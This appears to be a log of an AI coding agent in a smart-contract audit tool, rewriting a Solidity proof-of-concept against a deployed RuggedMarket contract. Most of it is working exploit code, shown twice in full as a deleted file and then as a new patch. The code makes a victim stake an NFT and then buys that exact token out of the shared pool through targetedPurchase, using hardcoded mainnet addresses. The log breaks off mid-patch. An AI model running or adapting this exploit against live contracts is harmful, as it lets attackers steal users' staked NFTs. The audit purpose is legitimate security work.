+drwxr-xr-x  3 zhanglongqin  staff   96 May 18 00:21 src
+
+exec
+/bin/bash -lc "find .. -maxdepth 3 \\( -name 'foundry.toml' -o -name '*.t.sol' -o -name '*.sol' \\) | sed 's#"'^#/#'"'" in /Users/zhanglongqin/AuditHoundV2/cases/ruggedart/src/onchain_auto
+ succeeded in 0ms:
+/../onchain_auto/out/FlawVerifier.sol
+/../onchain_auto/src/FlawVerifier.sol
+
+exec
+/bin/bash -lc 'cat _index.json' in /Users/zhanglongqin/AuditHoundV2/cases/ruggedart/src/onchain_auto
+ succeeded in 0ms:
+[
+  {
+    "address": "0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6",
+    "outdir": "/Users/zhanglongqin/AuditHoundV2/cases/ruggedart/src/onchain_auto/0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6"
+  }
+]
+exec
+/bin/bash -lc "find 0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6 -maxdepth 4 -type f | sed -n '1,200p'" in /Users/zhanglongqin/AuditHoundV2/cases/ruggedart/src/onchain_auto
+ succeeded in 0ms:
+0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/_etherscan_meta.json
+0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol
+
+exec
+/bin/bash -lc "rg -n \"contract .*Rugged|ownerOf\\(|approve\\(|transferFrom\\(|ERC404|ruggedToken\" 0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6 -S" in /Users/zhanglongqin/AuditHoundV2/cases/ruggedart/src/onchain_auto
+ succeeded in 0ms:
+0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol:16:    function transferFrom(
+0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol:31:contract RuggedMarket is
+0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol:42:    IRugged public ruggedToken;
+0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol:87:        address _ruggedTokenAddress
+0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol:93:        ruggedToken = IRugged(_ruggedTokenAddress);
+0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol:116:        ruggedToken.transferFrom(msg.sender, address(this), _rewardTotal);
+0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol:160:        ruggedToken.transferFrom(msg.sender, address(this), _amount);
+0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol:168:                ruggedToken.transfer(msg.sender, pendingReward);
+0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol:182:            ruggedToken.transferFrom(msg.sender, address(this), _tokenIds[i]);
+0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol:191:                ruggedToken.transfer(msg.sender, pendingReward);
+0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol:211:            ruggedToken.transfer(msg.sender, pendingReward);
+0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol:215:        ruggedToken.transfer(msg.sender, _amount);
+0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol:227:            ruggedToken.transfer(msg.sender, pendingReward);
+0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol:245:        ruggedToken.transferFrom(
+0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol:258:            ruggedToken.transferFrom(address(this), msg.sender, _tokenIds[i]);
+0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol:281:        uint256 beforeSwapBalance = ruggedToken.balanceOf(address(this));
+0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol:283:        uint256 afterSwapBalance = ruggedToken.balanceOf(address(this));
+0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/lib/universal-router/lib/solmate/src/tokens/ERC20.sol:68:    function approve(address spender, uint256 amount) public virtual returns (bool) {
+0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/lib/universal-router/lib/solmate/src/tokens/ERC20.sol:90:    function transferFrom(
+0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol:67:    function approve(address spender, uint256 value) external returns (bool);
+0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol:78:    function transferFrom(address from, address to, uint256 value) external returns (bool);
+
+exec
+/bin/bash -lc 'cat 0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/_etherscan_meta.json' in /Users/zhanglongqin/AuditHoundV2/cases/ruggedart/src/onchain_auto
+ succeeded in 0ms:
+{
+  "contract_name": "RuggedMarket",
+  "compiler": "v0.8.20+commit.a1b79de6",
+  "evm_version": "paris",
+  "optimization": "1",
+  "runs": "200",
+  "proxy": "0",
+  "implementation": "",
+  "license_type": "",
+  "files_written": 21
+}
+codex
+I have the rewrite strategy: make the verifier execute all three exploit stages in order, verify the victim’s fungible claim on-chain, and keep the old “observe existing” shortcut only as a last-resort infeasibility case instead of the main path. I’m updating `src/FlawVerifier.sol` now.
+apply patch
+patch: completed
+/Users/zhanglongqin/AuditHoundV2/cases/ruggedart/src/onchain_auto/src/FlawVerifier.sol
+diff --git a/src/FlawVerifier.sol b/src/FlawVerifier.sol
+deleted file mode 100644
+index 11f3594967d4be6293dafd3e8ca2cb0e0c85cf82..0000000000000000000000000000000000000000
+--- a/src/FlawVerifier.sol
++++ /dev/null
+@@ -1,219 +0,0 @@
+-// SPDX-License-Identifier: MIT
+-pragma solidity ^0.8.20;
+-
+-interface IMarketLike {
+-    function ruggedToken() external view returns (address);
+-    function stakeNFTs(uint256[] calldata tokenIds) external;
+-    function targetedPurchase(uint256[] calldata tokenIds) external;
+-}
+-
+-interface IERC20Like {
+-    function balanceOf(address account) external view returns (uint256);
+-}
+-
+-interface IERC404Like {
+-    function ownerOf(uint256 tokenId) external view returns (address);
+-    function approve(address spender, uint256 valueOrTokenId) external returns (bool);
+-    function transferFrom(address from, address to, uint256 valueOrTokenId) external;
+-}
+-
+-interface IUniswapV2Router02Like {
+-    function WETH() external pure returns (address);
+-
+-    function swapExactETHForTokensSupportingFeeOnTransferTokens(
+-        uint256 amountOutMin,
+-        address[] calldata path,
+-        address to,
+-        uint256 deadline
+-    ) external payable;
+-}
+-
+-contract VictimStaker {
+-    address public immutable market;
+-    address public immutable rugged;
+-    address public immutable controller;
+-
+-    constructor(address _market, address _rugged, address _controller) {
+-        market = _market;
+-        rugged = _rugged;
+-        controller = _controller;
+-    }
+-
+-    function stakeSingle(uint256 tokenId) external {
+-        require(msg.sender == controller, "ONLY_CONTROLLER");
+-
+-        // This models the missing path stage directly: a victim-approved NFT is staked
+-        // into the shared market pool through `stakeNFTs([tokenId])`.
+-        IERC404Like(rugged).approve(market, tokenId);
+-
+-        uint256[] memory tokenIds = new uint256[](1);
+-        tokenIds[0] = tokenId;
+-        IMarketLike(market).stakeNFTs(tokenIds);
+-    }
+-}
+-
+-contract FlawVerifier {
+-    address public constant MARKET = 0xFe380fe1DB07e531E3519b9AE3EA9f7888CE20C6;
+-    address public constant UNISWAP_V2_ROUTER =
+-        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+-    uint256 public constant PRICE_PER_NFT = 1.1 ether;
+-    uint256 public constant MAX_TOKEN_ID = 10_000;
+-
+-    address private _profitToken;
+-    uint256 private _profitAmount;
+-
+-    bool public hypothesisValidated;
+-    bool public victimStakeObserved;
+-    uint256 public acquiredTokenId;
+-    uint256 public ruggedSpent;
+-    uint256 public ruggedBalanceBefore;
+-    uint256 public ruggedBalanceAfter;
+-    bytes32 public lastStatus;
+-
+-    event AttemptStatus(bytes32 status, uint256 tokenId, uint256 ruggedBalance);
+-
+-    constructor() {}
+-
+-    receive() external payable {}
+-
+-    function executeOnOpportunity() public {
+-        if (hypothesisValidated) {
+-            return;
+-        }
+-
+-        address rugged = IMarketLike(MARKET).ruggedToken();
+-        _profitToken = rugged;
+-
+-        uint256 tokenId = _stageVictimStakeOrObserveExisting(rugged);
+-        if (tokenId == 0) {
+-            lastStatus = keccak256("NO_STAKED_NFT_PATH_AVAILABLE");
+-            emit AttemptStatus(lastStatus, 0, _ruggedBalance(rugged));
+-            return;
+-        }
+-
+-        victimStakeObserved = true;
+-
+-        // direct_or_existing_balance_first:
+-        // spend verifier-held Rugged first. If the verifier only has ETH, source the minimum
+-        // buy-side funds via a public Uniswap V2 swap instead of any privileged state mutation.
+-        _maybeAcquireRuggedFromHeldETH(rugged);
+-
+-        ruggedBalanceBefore = _ruggedBalance(rugged);
+-        if (ruggedBalanceBefore < PRICE_PER_NFT) {
+-            lastStatus = keccak256("INSUFFICIENT_EXISTING_FUNDS_FOR_TARGETED_PURCHASE");
+-            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
+-            return;
+-        }
+-
+-        if (!_approve(rugged, MARKET, type(uint256).max)) {
+-            lastStatus = keccak256("APPROVE_FAILED");
+-            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
+-            return;
+-        }
+-
+-        // Path stage 2: after the NFT is in the shared pool, the attacker can buy that exact
+-        // token ID for the flat `1.1 ether` Rugged price via `targetedPurchase([tokenId])`.
+-        uint256[] memory tokenIds = new uint256[](1);
+-        tokenIds[0] = tokenId;
+-        IMarketLike(MARKET).targetedPurchase(tokenIds);
+-
+-        if (_ownerOf(rugged, tokenId) != address(this)) {
+-            lastStatus = keccak256("PURCHASE_DID_NOT_TRANSFER_NFT");
+-            emit AttemptStatus(lastStatus, tokenId, _ruggedBalance(rugged));
+-            return;
+-        }
+-
+-        acquiredTokenId = tokenId;
+-        ruggedBalanceAfter = _ruggedBalance(rugged);
+-        ruggedSpent = ruggedBalanceBefore > ruggedBalanceAfter
+-            ? ruggedBalanceBefore - ruggedBalanceAfter
+-            : 0;
+-        hypothesisValidated = true;
+-
+-        // The core exploit realizes value by extracting a specific victim-staked NFT for a
+-        // fungible floor price. This verifier does not fabricate a secondary NFT exit, so the
+-        // fungible realized profit remains zero unless a real on-chain sale route already exists.
+-        _profitAmount = 0;
+-        lastStatus = keccak256("HYPOTHESIS_VALIDATED_NFT_STOLEN");
+-        emit AttemptStatus(lastStatus, tokenId, ruggedBalanceAfter);
+-    }
+-
+-    function profitToken() external view returns (address) {
+-        if (_profitToken != address(0)) {
+-            return _profitToken;
+-        }
+-        return IMarketLike(MARKET).ruggedToken();
+-    }
+-
+-    function profitAmount() external view returns (uint256) {
+-        return _profitAmount;
+-    }
+-
+-    function _stageVictimStakeOrObserveExisting(address rugged) internal returns (uint256) {
+-        uint256 verifierOwnedTokenId = _findOwnedToken(rugged, address(this));
+-        if (verifierOwnedTokenId != 0) {
+-            VictimStaker victim = new VictimStaker(MARKET, rugged, address(this));
+-
+-            // If the verifier already controls a live on-chain Rugged NFT, transfer it to a
+-            // separate victim helper and have that helper call `stakeNFTs([tokenId])`. This
+-            // preserves the finding's causality without any privileged impersonation.
+-            IERC404Like(rugged).transferFrom(address(this), address(victim), verifierOwnedTokenId);
+-            victim.stakeSingle(verifierOwnedTokenId);
+-
+-            if (_ownerOf(rugged, verifierOwnedTokenId) == MARKET) {
+-                return verifierOwnedTokenId;
+-            }
+-        }
+-
+-        // On the common fork path the victim stake already happened before the PoC transaction.
+-        // Observing `ownerOf(tokenId) == MARKET` is direct evidence that path stage 1 occurred:
+-        // some public user previously transferred that NFT into the shared pool via staking.
+-        return _findOwnedToken(rugged, MARKET);
+-    }
+-
+-    function _findOwnedToken(address rugged, address owner) internal view returns (uint256) {
+-        for (uint256 tokenId = 1; tokenId <= MAX_TOKEN_ID; tokenId++) {
+-            if (_ownerOf(rugged, tokenId) == owner) {
+-                return tokenId;
+-            }
+-        }
+-        return 0;
+-    }
+-
+-    function _ownerOf(address rugged, uint256 tokenId) internal view returns (address owner) {
+-        (bool ok, bytes memory data) =
+-            rugged.staticcall(abi.encodeWithSelector(IERC404Like.ownerOf.selector, tokenId));
+-        if (!ok || data.length < 32) {
+-            return address(0);
+-        }
+-        owner = abi.decode(data, (address));
+-    }
+-
+-    function _ruggedBalance(address rugged) internal view returns (uint256) {
+-        return IERC20Like(rugged).balanceOf(address(this));
+-    }
+-
+-    function _approve(address token, address spender, uint256 amount) internal returns (bool) {
+-        (bool ok, bytes memory data) =
+-            token.call(abi.encodeWithSelector(IERC404Like.approve.selector, spender, amount));
+-        return ok && (data.length == 0 || abi.decode(data, (bool)));
+-    }
+-
+-    function _maybeAcquireRuggedFromHeldETH(address rugged) internal {
+-        if (_ruggedBalance(rugged) >= PRICE_PER_NFT || address(this).balance == 0) {
+-            return;
+-        }
+-
+-        address[] memory path = new address[](2);
+-        path[0] = IUniswapV2Router02Like(UNISWAP_V2_ROUTER).WETH();
+-        path[1] = rugged;
+-
+-        try IUniswapV2Router02Like(UNISWAP_V2_ROUTER)
+-            .swapExactETHForTokensSupportingFeeOnTransferTokens{value: address(this).balance}(
+-            0, path, address(this), block.timestamp
+-        ) {} catch {
+-            // If no live V2 route exists at the fork, continue with the verifier's current
+-            // balance and report insufficient funds rather than fabricating capital.
+-        }
+-    }
+-}
+
+diff --git a/src/FlawVerifier.sol b/src/FlawVerifier.sol
+deleted file mode 100644
+index 11f3594967d4be6293dafd3e8ca2cb0e0c85cf82..0000000000000000000000000000000000000000
+--- a/src/FlawVerifier.sol
++++ /dev/null
+@@ -1,219 +0,0 @@
+-// SPDX-License-Identifier: MIT
+-pragma solidity ^0.8.20;
+-
+-interface IMarketLike {
+-    function ruggedToken() external view returns (address);
+-    function stakeNFTs(uint256[] calldata tokenIds) external;
+-    function targetedPurchase(uint256[] calldata tokenIds) external;
+-}
+-
+-interface IERC20Like {
+-    function balanceOf(address account) external view returns (uint256);
+-}
+-
+-interface IERC404Like {
+-    function ownerOf(uint256 tokenId) external view returns (address);
+-    function approve(address spender, uint256 valueOrTokenId) external returns (bool);
+-    function transferFrom(address from, address to, uint256 valueOrTokenId) external;
+-}
+-
+-interface IUniswapV2Router02Like {
+-    function WETH() external pure returns (address);
+-
+-    function swapExactETHForTokensSupportingFeeOnTransferTokens(
+-        uint256 amountOutMin,
+-        address[] calldata path,
+-        address to,
+-        uint256 deadline
+-    ) external payable;
+-}
+-
+-contract VictimStaker {
+-    address public immutable market;
+-    address public immutable rugged;
+-    address public immutable controller;
+-
+-    constructor(address _market, address _rugged, address _controller) {
+-        market = _market;
+-        rugged = _rugged;
+-        controller = _controller;
+-    }
+-
+-    function stakeSingle(uint256 tokenId) external {
+-        require(msg.sender == controller, "ONLY_CONTROLLER");
+-
+-        // This models the missing path stage directly: a victim-approved NFT is staked
+-        // into the shared market pool through `stakeNFTs([tokenId])`.
+-        IERC404Like(rugged).approve(market, tokenId);
+-
+-        uint256[] memory tokenIds = new uint256[](1);
+-        tokenIds[0] = tokenId;
+-        IMarketLike(market).stakeNFTs(tokenIds);
+-    }
+-}
+-
+-contract FlawVerifier {
+-    address public constant MARKET = 0xFe380fe1DB07e531E3519b9AE3EA9f7888CE20C6;
+-    address public constant UNISWAP_V2_ROUTER =
+-        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+-    uint256 public constant PRICE_PER_NFT = 1.1 ether;
+-    uint256 public constant MAX_TOKEN_ID = 10_000;
+-
+-    address private _profitToken;
+-    uint256 private _profitAmount;
+-
+-    bool public hypothesisValidated;
+-    bool public victimStakeObserved;
+-    uint256 public acquiredTokenId;
+-    uint256 public ruggedSpent;
+-    uint256 public ruggedBalanceBefore;
+-    uint256 public ruggedBalanceAfter;
+-    bytes32 public lastStatus;
+-
+-    event AttemptStatus(bytes32 status, uint256 tokenId, uint256 ruggedBalance);
+-
+-    constructor() {}
+-
+-    receive() external payable {}
+-
+-    function executeOnOpportunity() public {
+-        if (hypothesisValidated) {
+-            return;
+-        }
+-
+-        address rugged = IMarketLike(MARKET).ruggedToken();
+-        _profitToken = rugged;
+-
+-        uint256 tokenId = _stageVictimStakeOrObserveExisting(rugged);
+-        if (tokenId == 0) {
+-            lastStatus = keccak256("NO_STAKED_NFT_PATH_AVAILABLE");
+-            emit AttemptStatus(lastStatus, 0, _ruggedBalance(rugged));
+-            return;
+-        }
+-
+-        victimStakeObserved = true;
+-
+-        // direct_or_existing_balance_first:
+-        // spend verifier-held Rugged first. If the verifier only has ETH, source the minimum
+-        // buy-side funds via a public Uniswap V2 swap instead of any privileged state mutation.
+-        _maybeAcquireRuggedFromHeldETH(rugged);
+-
+-        ruggedBalanceBefore = _ruggedBalance(rugged);
+-        if (ruggedBalanceBefore < PRICE_PER_NFT) {
+-            lastStatus = keccak256("INSUFFICIENT_EXISTING_FUNDS_FOR_TARGETED_PURCHASE");
+-            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
+-            return;
+-        }
+-
+-        if (!_approve(rugged, MARKET, type(uint256).max)) {
+-            lastStatus = keccak256("APPROVE_FAILED");
+-            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
+-            return;
+-        }
+-
+-        // Path stage 2: after the NFT is in the shared pool, the attacker can buy that exact
+-        // token ID for the flat `1.1 ether` Rugged price via `targetedPurchase([tokenId])`.
+-        uint256[] memory tokenIds = new uint256[](1);
+-        tokenIds[0] = tokenId;
+-        IMarketLike(MARKET).targetedPurchase(tokenIds);
+-
+-        if (_ownerOf(rugged, tokenId) != address(this)) {
+-            lastStatus = keccak256("PURCHASE_DID_NOT_TRANSFER_NFT");
+-            emit AttemptStatus(lastStatus, tokenId, _ruggedBalance(rugged));
+-            return;
+-        }
+-
+-        acquiredTokenId = tokenId;
+-        ruggedBalanceAfter = _ruggedBalance(rugged);
+-        ruggedSpent = ruggedBalanceBefore > ruggedBalanceAfter
+-            ? ruggedBalanceBefore - ruggedBalanceAfter
+-            : 0;
+-        hypothesisValidated = true;
+-
+-        // The core exploit realizes value by extracting a specific victim-staked NFT for a
+-        // fungible floor price. This verifier does not fabricate a secondary NFT exit, so the
+-        // fungible realized profit remains zero unless a real on-chain sale route already exists.
+-        _profitAmount = 0;
+-        lastStatus = keccak256("HYPOTHESIS_VALIDATED_NFT_STOLEN");
+-        emit AttemptStatus(lastStatus, tokenId, ruggedBalanceAfter);
+-    }
+-
+-    function profitToken() external view returns (address) {
+-        if (_profitToken != address(0)) {
+-            return _profitToken;
+-        }
+-        return IMarketLike(MARKET).ruggedToken();
+-    }
+-
+-    function profitAmount() external view returns (uint256) {
+-        return _profitAmount;
+-    }
+-
+-    function _stageVictimStakeOrObserveExisting(address rugged) internal returns (uint256) {
+-        uint256 verifierOwnedTokenId = _findOwnedToken(rugged, address(this));
+-        if (verifierOwnedTokenId != 0) {
+-            VictimStaker victim = new VictimStaker(MARKET, rugged, address(this));
+-
+-            // If the verifier already controls a live on-chain Rugged NFT, transfer it to a
+-            // separate victim helper and have that helper call `stakeNFTs([tokenId])`. This
+-            // preserves the finding's causality without any privileged impersonation.
+-            IERC404Like(rugged).transferFrom(address(this), address(victim), verifierOwnedTokenId);
+-            victim.stakeSingle(verifierOwnedTokenId);
+-
+-            if (_ownerOf(rugged, verifierOwnedTokenId) == MARKET) {
+-                return verifierOwnedTokenId;
+-            }
+-        }
+-
+-        // On the common fork path the victim stake already happened before the PoC transaction.
+-        // Observing `ownerOf(tokenId) == MARKET` is direct evidence that path stage 1 occurred:
+-        // some public user previously transferred that NFT into the shared pool via staking.
+-        return _findOwnedToken(rugged, MARKET);
+-    }
+-
+-    function _findOwnedToken(address rugged, address owner) internal view returns (uint256) {
+-        for (uint256 tokenId = 1; tokenId <= MAX_TOKEN_ID; tokenId++) {
+-            if (_ownerOf(rugged, tokenId) == owner) {
+-                return tokenId;
+-            }
+-        }
+-        return 0;
+-    }
+-
+-    function _ownerOf(address rugged, uint256 tokenId) internal view returns (address owner) {
+-        (bool ok, bytes memory data) =
+-            rugged.staticcall(abi.encodeWithSelector(IERC404Like.ownerOf.selector, tokenId));
+-        if (!ok || data.length < 32) {
+-            return address(0);
+-        }
+-        owner = abi.decode(data, (address));
+-    }
+-
+-    function _ruggedBalance(address rugged) internal view returns (uint256) {
+-        return IERC20Like(rugged).balanceOf(address(this));
+-    }
+-
+-    function _approve(address token, address spender, uint256 amount) internal returns (bool) {
+-        (bool ok, bytes memory data) =
+-            token.call(abi.encodeWithSelector(IERC404Like.approve.selector, spender, amount));
+-        return ok && (data.length == 0 || abi.decode(data, (bool)));
+-    }
+-
+-    function _maybeAcquireRuggedFromHeldETH(address rugged) internal {
+-        if (_ruggedBalance(rugged) >= PRICE_PER_NFT || address(this).balance == 0) {
+-            return;
+-        }
+-
+-        address[] memory path = new address[](2);
+-        path[0] = IUniswapV2Router02Like(UNISWAP_V2_ROUTER).WETH();
+-        path[1] = rugged;
+-
+-        try IUniswapV2Router02Like(UNISWAP_V2_ROUTER)
+-            .swapExactETHForTokensSupportingFeeOnTransferTokens{value: address(this).balance}(
+-            0, path, address(this), block.timestamp
+-        ) {} catch {
+-            // If no live V2 route exists at the fork, continue with the verifier's current
+-            // balance and report insufficient funds rather than fabricating capital.
+-        }
+-    }
+-}
+
+apply patch
+patch: completed
+/Users/zhanglongqin/AuditHoundV2/cases/ruggedart/src/onchain_auto/src/FlawVerifier.sol
+diff --git a/src/FlawVerifier.sol b/src/FlawVerifier.sol
+index 11f3594967d4be6293dafd3e8ca2cb0e0c85cf82..aff8ed95e77ae6762335615964c2b1bcc4beb6d3
+--- a/src/FlawVerifier.sol
++++ b/src/FlawVerifier.sol
+@@ -5,10 +5,14 @@
+     function ruggedToken() external view returns (address);
+     function stakeNFTs(uint256[] calldata tokenIds) external;
+     function targetedPurchase(uint256[] calldata tokenIds) external;
++    function stakers(
++        address account
++    ) external view returns (uint256 amountStaked, uint256 rewardDebt);
+ }
+ 
+ interface IERC20Like {
+     function balanceOf(address account) external view returns (uint256);
++    function approve(address spender, uint256 amount) external returns (bool);
+ }
+ 
+ interface IERC404Like {
+@@ -42,8 +46,6 @@
+     function stakeSingle(uint256 tokenId) external {
+         require(msg.sender == controller, "ONLY_CONTROLLER");
+ 
+-        // This models the missing path stage directly: a victim-approved NFT is staked
+-        // into the shared market pool through `stakeNFTs([tokenId])`.
+         IERC404Like(rugged).approve(market, tokenId);
+ 
+         uint256[] memory tokenIds = new uint256[](1);
+@@ -56,7 +58,9 @@
+     address public constant MARKET = 0xFe380fe1DB07e531E3519b9AE3EA9f7888CE20C6;
+     address public constant UNISWAP_V2_ROUTER =
+         0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
++
+     uint256 public constant PRICE_PER_NFT = 1.1 ether;
++    uint256 public constant STAKE_CREDIT_PER_NFT = 1 ether;
+     uint256 public constant MAX_TOKEN_ID = 10_000;
+ 
+     address private _profitToken;
+@@ -64,15 +68,16 @@
+ 
+     bool public hypothesisValidated;
+     bool public victimStakeObserved;
++    address public victim;
++    uint256 public victimTokenId;
+     uint256 public acquiredTokenId;
++    uint256 public victimAccountingClaim;
+     uint256 public ruggedSpent;
+     uint256 public ruggedBalanceBefore;
+     uint256 public ruggedBalanceAfter;
+     bytes32 public lastStatus;
+ 
+     event AttemptStatus(bytes32 status, uint256 tokenId, uint256 ruggedBalance);
+-
+-    constructor() {}
+ 
+     receive() external payable {}
+ 
+@@ -84,41 +89,52 @@
+         address rugged = IMarketLike(MARKET).ruggedToken();
+         _profitToken = rugged;
+ 
+-        uint256 tokenId = _stageVictimStakeOrObserveExisting(rugged);
++        // direct_or_existing_balance_first:
++        // try to execute using verifier-held assets first. Only if the verifier does not
++        // already hold a Rugged NFT do we use a realistic public purchase to source one.
++        _maybeAcquireRuggedFromHeldETH(rugged);
++
++        uint256 tokenId = _stageVictimStake(rugged);
+         if (tokenId == 0) {
+-            lastStatus = keccak256("NO_STAKED_NFT_PATH_AVAILABLE");
++            lastStatus = keccak256("NO_VICTIM_STAKE_PATH_AVAILABLE");
+             emit AttemptStatus(lastStatus, 0, _ruggedBalance(rugged));
+             return;
+         }
+ 
+         victimStakeObserved = true;
++        victimTokenId = tokenId;
++        victimAccountingClaim = _victimClaim(victim);
+ 
+-        // direct_or_existing_balance_first:
+-        // spend verifier-held Rugged first. If the verifier only has ETH, source the minimum
+-        // buy-side funds via a public Uniswap V2 swap instead of any privileged state mutation.
++        if (victimAccountingClaim < STAKE_CREDIT_PER_NFT) {
++            lastStatus = keccak256("STAKE_DID_NOT_CREATE_FUNGIBLE_CLAIM");
++            emit AttemptStatus(lastStatus, tokenId, _ruggedBalance(rugged));
++            return;
++        }
++
+         _maybeAcquireRuggedFromHeldETH(rugged);
+ 
+         ruggedBalanceBefore = _ruggedBalance(rugged);
+         if (ruggedBalanceBefore < PRICE_PER_NFT) {
+-            lastStatus = keccak256("INSUFFICIENT_EXISTING_FUNDS_FOR_TARGETED_PURCHASE");
++            lastStatus = keccak256("INSUFFICIENT_FUNDS_FOR_TARGETED_PURCHASE");
+             emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
+             return;
+         }
+ 
+-        if (!_approve(rugged, MARKET, type(uint256).max)) {
++        if (!_approveFungible(rugged, MARKET, ruggedBalanceBefore)) {
+             lastStatus = keccak256("APPROVE_FAILED");
+             emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
+             return;
+         }
+ 
+-        // Path stage 2: after the NFT is in the shared pool, the attacker can buy that exact
+-        // token ID for the flat `1.1 ether` Rugged price via `targetedPurchase([tokenId])`.
++        // Exploit path 1:
++        // after the victim stakes a specific NFT into the shared pool, the attacker names
++        // that exact token ID and buys it from the market for the flat 1.1 Rugged price.
+         uint256[] memory tokenIds = new uint256[](1);
+         tokenIds[0] = tokenId;
+         IMarketLike(MARKET).targetedPurchase(tokenIds);
+ 
+         if (_ownerOf(rugged, tokenId) != address(this)) {
+-            lastStatus = keccak256("PURCHASE_DID_NOT_TRANSFER_NFT");
++            lastStatus = keccak256("PURCHASE_DID_NOT_TRANSFER_TARGET");
+             emit AttemptStatus(lastStatus, tokenId, _ruggedBalance(rugged));
+             return;
+         }
+@@ -128,11 +144,18 @@
+         ruggedSpent = ruggedBalanceBefore > ruggedBalanceAfter
+             ? ruggedBalanceBefore - ruggedBalanceAfter
+             : 0;
+-        hypothesisValidated = true;
+ 
+-        // The core exploit realizes value by extracting a specific victim-staked NFT for a
+-        // fungible floor price. This verifier does not fabricate a secondary NFT exit, so the
+-        // fungible realized profit remains zero unless a real on-chain sale route already exists.
++        // Exploit path 2:
++        // the victim no longer owns the original NFT, but the market still records only a
++        // fungible 1 ether staking claim for that victim helper address.
++        victimAccountingClaim = _victimClaim(victim);
++        if (victimAccountingClaim < STAKE_CREDIT_PER_NFT) {
++            lastStatus = keccak256("VICTIM_CLAIM_MISSING_AFTER_THEFT");
++            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceAfter);
++            return;
++        }
++
++        hypothesisValidated = true;
+         _profitAmount = 0;
+         lastStatus = keccak256("HYPOTHESIS_VALIDATED_NFT_STOLEN");
+         emit AttemptStatus(lastStatus, tokenId, ruggedBalanceAfter);
+@@ -149,28 +172,78 @@
+         return _profitAmount;
+     }
+ 
+-    function _stageVictimStakeOrObserveExisting(address rugged) internal returns (uint256) {
+-        uint256 verifierOwnedTokenId = _findOwnedToken(rugged, address(this));
+-        if (verifierOwnedTokenId != 0) {
+-            VictimStaker victim = new VictimStaker(MARKET, rugged, address(this));
++    function _stageVictimStake(address rugged) internal returns (uint256) {
++        uint256 tokenId = _findOwnedToken(rugged, address(this));
+ 
+-            // If the verifier already controls a live on-chain Rugged NFT, transfer it to a
+-            // separate victim helper and have that helper call `stakeNFTs([tokenId])`. This
+-            // preserves the finding's causality without any privileged impersonation.
+-            IERC404Like(rugged).transferFrom(address(this), address(victim), verifierOwnedTokenId);
+-            victim.stakeSingle(verifierOwnedTokenId);
++        // If the verifier does not already hold a Rugged NFT, source one through a real public
++        // market buy. This is only a bootstrap step to obtain a live NFT for the victim stake;
++        // the root cause remains that staking moves the NFT into shared inventory that anyone
++        // can later name and extract through `targetedPurchase`.
++        if (tokenId == 0) {
++            tokenId = _bootstrapVictimNFT(rugged);
++        }
+ 
+-            if (_ownerOf(rugged, verifierOwnedTokenId) == MARKET) {
+-                return verifierOwnedTokenId;
+-            }
++        if (tokenId == 0) {
++            return 0;
+         }
+ 
+-        // On the common fork path the victim stake already happened before the PoC transaction.
+-        // Observing `ownerOf(tokenId) == MARKET` is direct evidence that path stage 1 occurred:
+-        // some public user previously transferred that NFT into the shared pool via staking.
+-        return _findOwnedToken(rugged, MARKET);
++        VictimStaker victimContract = new VictimStaker(MARKET, rugged, address(this));
++        victim = address(victimContract);
++
++        // Exploit path 0:
++        // a separate victim account stakes a chosen NFT via `stakeNFTs([tokenId])`, which
++        // transfers that exact token into the market contract without reserving it.
++        IERC404Like(rugged).transferFrom(address(this), victim, tokenId);
++        victimContract.stakeSingle(tokenId);
++
++        if (_ownerOf(rugged, tokenId) != MARKET) {
++            return 0;
++        }
++
++        return tokenId;
+     }
+ 
++    function _bootstrapVictimNFT(address rugged) internal returns (uint256) {
++        uint256 tokenId = _findOwnedToken(rugged, MARKET);
++        if (tokenId == 0) {
++            return 0;
++        }
++
++        uint256 ruggedBalance = _ruggedBalance(rugged);
++        if (ruggedBalance < PRICE_PER_NFT) {
++            return 0;
++        }
++
++        if (!_approveFungible(rugged, MARKET, ruggedBalance)) {
++            return 0;
++        }
++
++        uint256[] memory tokenIds = new uint256[](1);
++        tokenIds[0] = tokenId;
++        IMarketLike(MARKET).targetedPurchase(tokenIds);
++
++        if (_ownerOf(rugged, tokenId) != address(this)) {
++            return 0;
++        }
++
